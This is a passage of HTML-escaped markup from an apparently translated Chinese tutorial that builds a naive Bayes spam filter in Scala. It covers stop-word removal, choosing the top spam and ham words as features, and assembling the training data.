&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06134c259180377-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;nonEmpty&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;stopWords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06134c259180377-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06134c259180377-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;groupBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06134c259180377-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;groupBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06134c259180377-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06134c259180377-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toList&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0059 seconds] --&gt;
&lt;p&gt;如果马上观察垃圾邮件和正常邮件的 top 50 单词，就可以看到大多数停用词已经消失了。我们可以再作调整，但现在就用这个结果吧。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/bcc6c5ca2c60a6710fff94b85097c28d.jpg&quot; width=&quot;790px&quot; height=&quot;395px&quot;&gt;&lt;img src=&quot;/images/jobbole.com/03b6787b019e67e9d4f01c2cc3940366.jpg&quot; width=&quot;790px&quot; height=&quot;395px&quot;&gt;&lt;/p&gt;
&lt;p&gt;在了解了什么是“垃圾单词”和“正常单词”之后，我们就可以决定建立一个特征集了，稍后我们会把它用在朴素贝叶斯算法中以创建一个分类器。注意：包含更多的特征总是更好的，然而，若把所有单词都作为特征，则可能出现性能问题。这就是为什么在机器学习领域，很多开发者倾向于弃用没有明显影响的特征，纯粹就是性能方面的原因。另外，机器学习过程可以通过在完整的 &lt;a href=&quot;http://hadoop.apache.org/&quot;&gt;Hadoop&lt;/a&gt; 集群上运行来完成，但是阐明这方面的内容就超出了本文的范围。&lt;/p&gt;
&lt;p&gt;现在我们要选出出现率（而不是频率）最高的 100 个“垃圾单词”和 100 个“正常单词”，并把它们组合成一个单词集，它将输入到贝叶斯算法。最后，我们要转换这些训练数据以适应贝叶斯算法的输入格式。注意最终的特征集大小为 200（其中，#公共单词×2）。请随意用更大或更小的特征数做实验。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d061350672727556&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
//Add the code for getting the TDM data and combining it into a feature bag.
//添加生成TDM数据并将其合成一个特征包的代码
val hamFeatures = hamTDM
    .records
    .take(amountOfFeaturesToTake)
    .map(x =&amp;gt; x.term)

val spamFeatures = spamTDM
    .records
    .take(amountOfFeaturesToTake)
    .map(x =&amp;gt; x.term)

//Now we have a set of ham and spam features,
//现在我们有了一套正常邮件和垃圾邮件特征，
// we group them and then remove the intersecting features, as these are noise.
//我们将它们组合在一起并将公共特征去除，因为它们是噪声
var data = (hamFeatures ++ spamFeatures).toSet
hamFeatures
    .intersect(spamFeatures)
    .foreach(x =&amp;gt; data = (data - x))

//Initialise a bag of words that takes the top x features 
//from both spam and ham and combines them
//初始化一个单词包，从垃圾特征集和正常特征集中取出最前的x个特征，将它们合并
var bag = new Bag[String] (data.toArray)
//Initialise the classifier array with first a set of 0(spam)
//and then a set of 1(ham) values that represent the emails
//将该分类器数组初始化，首先用一组数值0代替垃圾邮件，然后用一组数值1代替正常邮件
var classifiers =   Array.fill[Int](amountOfSamplesPerSet)(0) ++
                    Array.fill[Int](amountOfSamplesPerSet)(1)

//Get the trainingData in the right format for the spam mails
//取得正确格式的垃圾邮件训练数据
var spamData = spamMails
    .map(x =&amp;gt; bag.feature(x._2.split(&quot; &quot;)))
    .toArray

//Get the trainingData in the right format for the ham mails
//取得正确格式的正常邮件训练数据
var hamData = hamMails
    .map(x =&amp;gt; bag.feature(x._2.split(&quot; &quot;)))
    .toArray

//Combine the training data from both categories
//将两种训练数据合并
var trainingData = spamData ++ hamData&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061350672727556-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061350672727556-46&quot;&gt;46&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-1&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Add the code for getting the TDM data and combining it into a feature bag.&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-2&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//添加生成TDM数据并将其合成一个特征包的代码&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-3&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;hamFeatures&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;hamTDM&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;records&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;take&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;amountOfFeaturesToTake&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;term&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-7&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-8&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;spamFeatures&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;spamTDM&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;records&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;take&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;amountOfFeaturesToTake&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;term&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-13&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Now we have a set of ham and spam features,&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-14&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//现在我们有了一套正常邮件和垃圾邮件特征，&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-15&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;// we group them and then remove the intersecting features, as these are noise.&lt;/span&gt;&lt;/div&gt;
